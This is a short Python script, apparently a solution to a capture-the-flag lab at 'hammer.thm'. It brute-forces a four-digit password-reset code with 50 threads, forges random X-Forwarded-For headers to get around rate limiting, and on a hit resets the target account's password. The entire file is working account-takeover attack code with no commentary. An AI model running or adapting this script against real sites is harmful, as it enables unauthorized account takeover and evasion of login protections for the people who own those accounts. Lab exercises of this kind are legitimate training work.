import threading, random, requests
url = "http://10.201.77.2:1337/reset_password.php"
count = 1
stop_flag = threading.Event()
def brute_force(session,start,end):
    #r = session.post(url,data = {"email":"tester@hammer.thm"})
    #print(r.status_code)
    for i in range(start,end):
        if stop_flag.is_set():
            return
        if i%6==0:
            session.post(url,data = {"email":"tester@hammer.thm"})
        response = session.post(url, data = {"recovery_code":f'{i:04d}', "s":"180"}, headers = {"X-Forwarded-For":f'{str(random.randint(0,255))}.{str(random.randint(0,255))}.{str(random.randint(0,255))}.{str(random.randint(0,255))}'})
        if "Invalid or expired recovery code!" not in response.text and 'new_password' in response.text:
            print(f'The recovery code is: {i:04d}')
            print(response.text)
            print(response.headers)
            r = session.post(url, data = {"new_password":"domixi", "confirm_password":"domixi"},headers = {"X-Forwarded-For":'127.6.7.2'})
            print(r.status_code)
            print(r.text)
            stop_flag.set()
    return

def main():
    #session = requests.Session()
    session = requests.Session()
    r = session.post(url,data = {"email":"tester@hammer.thm"})
    loop = 10000
    num_threads = 50
    threads=[]
    step = loop//num_threads
    for i in range(num_threads):
        start = i*step
        end = start + step
        thread = threading.Thread(target = brute_force, args = [session,start,end])
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
if __name__ == "__main__":
    main()